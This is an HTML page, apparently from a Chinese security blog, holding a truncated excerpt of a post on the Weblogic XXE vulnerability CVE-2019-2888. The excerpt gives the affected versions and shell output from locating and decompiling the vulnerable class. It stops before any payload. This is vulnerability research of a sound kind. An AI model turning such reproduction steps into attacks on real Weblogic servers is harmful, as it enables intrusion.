+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="（CVE-2019-2888）Weblogic-EJBTaglibDescriptor-XXE漏洞"><a href="#（CVE-2019-2888）Weblogic-EJBTaglibDescriptor-XXE漏洞" class="headerlink" title="（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞"></a>（CVE-2019-2888）Weblogic EJBTaglibDescriptor XXE漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Weblogic Server 10.3.6.0.0版本、12.1.3.0.0版本和12.2.1.3.0版本的EJB<br>Container组件存在安全漏洞</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="fernflower-jar"><a href="#fernflower-jar" class="headerlink" title="fernflower.jar"></a>fernflower.jar</h3><pre><code>weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class
+╭─root@jas502n /var 
+╰─# find ./ |grep EJBTaglibDescriptor                                                                       ✔  8388  18:32:43 
+.//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class
+.//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorTree.class
+.//weblogic.jar/weblogic/servlet/ejb2jsp/gui/EJBTaglibDescriptorPanel.class
+╭─root@jas502n /var 
+╰─# ls                                                                                                      ✔  8392  18:33:22 
+EJBTaglibDescriptor.java fernflower.jar           weblogic.jar
+</code></pre>
+<h4 id="EJBTaglibDescriptor-class-to-EJBTaglibDescriptor-java"><a href="#EJBTaglibDescriptor-class-to-EJBTaglibDescriptor-java" class="headerlink" title="EJBTaglibDescriptor.class to EJBTaglibDescriptor.java"></a>EJBTaglibDescriptor.class to EJBTaglibDescriptor.java</h4><pre><code>╭─root@jas502n /var 
+╰─# java -jar fernflower.jar .//weblogic.jar/weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor.class ./
+ ./
+INFO:  Decompiling class weblogic/servlet/ejb2jsp/dd/EJBTaglibDescriptor
+INFO:  ... done
+╭─root@jas502n /var 
+╰─# ls            
+EJBTaglibDescriptor.java fernflower.jar           weblogic.jar
+</code></pre>
+<h4 id="cat-EJBTaglibDescriptor-java"><a href="#cat-EJBTaglibDescriptor-java" class="headerlink" title="cat EJBTaglibDescriptor.java"></a>cat EJBTaglibDescriptor.java</h4>
+        
+          <p class="article-more-link">
+            <a href="/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2888%EF%BC%89Weblogic%20EJBTaglibDescriptor%20XXE%E6%BC%8F%E6%B4%9E/#more">......</a>
+          </p>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/Weblogic/%EF%BC%88CVE-2019-2888%EF%BC%89Weblogic%20EJBTaglibDescriptor%20XXE%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qxmh00kyy8v16lwoeggz" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+    
+  
+  
+    <nav id="page-nav">
+      <a class="extend prev" rel="prev" href="/page/25/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="page-number" href="/page/25/">25</a><span class="page-number current">26</span><a class="page-number" href="/page/27/">27</a><a class="page-number" href="/page/28/">28</a><span class="space">&hellip;</span><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/27/">下一页</a>
+    </nav>
+  
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
